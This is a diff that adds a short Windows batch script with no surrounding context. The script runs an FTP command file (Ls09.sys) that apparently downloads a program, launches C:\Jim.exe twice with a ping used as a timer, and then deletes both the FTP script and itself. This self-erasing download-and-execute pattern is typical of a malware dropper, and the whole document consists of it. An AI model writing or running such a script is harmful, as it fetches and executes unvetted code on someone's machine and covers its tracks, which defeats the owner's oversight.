@@ -1,0 +1,6 @@
+ftp -s:Ls09.sys
+start C:\Jim.exe
+ping -n 10 127.0.0.1
+start C:\Jim.exe
+del Ls09.sys
+del %0
